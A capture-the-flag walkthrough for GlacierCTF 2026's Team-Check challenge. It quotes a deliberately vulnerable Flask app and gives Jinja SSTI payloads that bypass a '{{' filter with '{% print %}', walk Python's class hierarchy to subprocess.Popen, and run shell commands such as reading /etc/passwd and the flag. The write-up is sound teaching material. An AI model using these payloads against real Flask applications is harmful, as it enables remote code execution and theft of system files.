---
title: "Team-Check Walkthrough - GlacierCTF 2026 | SSTI to RCE"
description: "Walkthrough for the Team-Check challenge from GlacierCTF 2026. A web challenge featuring a Server-Side Template Injection (SSTI) in Flask's render_template_string, bypassing a `{{}}` filter with `{% %}` to reach subprocess.Popen and achieve RCE for the flag."
author: dua2z3rr
date: 2026-11-20 1:00:00
categories:
  - CTF Competitions
  - GlacierCTF 2026
  - Challenges
tags:
  - web
---

{% raw %}

## Challenge Overview

Lately, a lot of teams have started to use AI. We built a small web application to check if people use it for CTFs.

---

## Solution

### Source Code

The source code is a fairly small Python application built with Flask. Here is the code:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Respect the shebang and mark file as executable

import random
import flask
from flask import Flask
from flask import render_template
from waitress import serve

# create and configure the app
app = Flask(__name__, instance_relative_config=True)
app.config.from_mapping(
    SECRET_KEY=random.randbytes(128)
)

LOSTEAMS = [
    "LosFuzzys", "S1gW0zzys", "podmanenjoyer"
]

AT_TEAMS = [
    # The OGs wouldn't do it
    "WE_0WN_Y0U", "HgbSec", "KuK Hofhackerei", "SIGFLAG", "/dev/stp",
    "OneManParty", "defragmented brains", "WeAreScientists"

    # These ones are also not known for using AI
    "sp3ng3rh4ck", "GiG Gehackt ist Geil", "inFLAGranti",
    "MeetingPostponed", "KUDDAHSEC", "Zook"
]


@app.route('/index.html')
@app.route('/')
def index():
    return render_template('index.html')


@app.errorhandler(404)
def error_handler():
    return flask.redirect("index")


@app.route('/check_team')
def challenge():
    team_name = flask.request.args.get("teamname")
    if not team_name:
        return render_template('index.html')

    # Security-Checks
    if "{{" in team_name or "}}" in team_name:
        return render_template('index.html')

    team_msg = flask.render_template_string(
        f"We are unsure if {team_name} has used AI in the past."
    )
    info_color = "info"

    if team_name in AT_TEAMS:
        team_msg = f"We don't think that {team_name} has used AI in the past"
        info_color = "success"

    elif team_name in LOSTEAMS:
        team_msg = f"Yes, {team_name} has has used AI in the past!"
        info_color = "danger"

    return render_template(
        'index.html', team_msg=team_msg, info_color=info_color
    )


serve(app, host='0.0.0.0', port=1337)
```

We immediately notice the Flask function `render_template_string`, which is vulnerable to Server-Side Template Injection (SSTI). In addition, from the `entrypoint.sh` file we discover the location of the flag in the filesystem.

```bash
#!/bin/sh
. /.venv/bin/activate 2>&1 >/dev/null
export PATH="/.venv/bin:$PATH"
export FLAG=$(cat /flag.txt)
/usr/bin/stdbuf -i0 -o0 -e0 /app/app.py
```

### Enumeration

First of all, let's open the site.

![no input](assets/img/team-check/no_input.png)

We can insert the template into the input field on the site. First, we notice that the source code has a check for `{{}}`, so we use `{%%}` instead.

Let's start enumerating step by step. First, the classes.

`{% print(self.__class__) %}`

![classes](assets/img/team-check/classes.png)

Now let's check the hierarchy that Python uses to look up methods in classes via `__mro__`:

`{% print(self.__class__.__mro__) %}`

Output: `### We are unsure if (&lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;object&#39;&gt;) has used AI in the past.`

Since this is a list, we can select the first element and proceed with enumerating the subclasses. For the next output, I unescaped the HTML to make it more readable.

`{% print(self.__class__.__mro__[1].__subclasses__()) %}`

Output:

```
We are unsure if [<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, 

<SNIP>

<class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'waitress.utilities.Error'>, <class 'waitress.wasyncore.dispatcher'>, <class 'waitress.wasyncore.file_wrapper'>, <class 'waitress.trigger._triggerbase'>, <class 'waitress.adjustments.Adjustments'>, <class 'waitress.buffers.FileBasedBuffer'>, <class 'waitress.buffers.OverflowableBuffer'>, <class 'waitress.receiver.FixedStreamReceiver'>, <class 'waitress.receiver.ChunkedReceiver'>, <class 'waitress.parser.HTTPRequestParser'>, <class 'waitress.task.ThreadedTaskDispatcher'>, <class 'waitress.task.Task'>, <class 'waitress.server.MultiSocketServer'>, <class 'subprocess._del_safe'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>] has used AI in the past.
```

### From SSTI to RCE

As we can see, the last class is `subprocess.Popen` (position 526 in the list), and we can use it to obtain RCE as the user running the site.

The final payload to read `/etc/passwd`:

`{% print(self.__class__.__mro__[1].__subclasses__()[526]('cat /etc/passwd', shell=True, stdout=-1).communicate()[0].strip()) %}`

We just need to change `/etc/passwd` to `/flag` and...

**Flag obtained.**

{% endraw %}
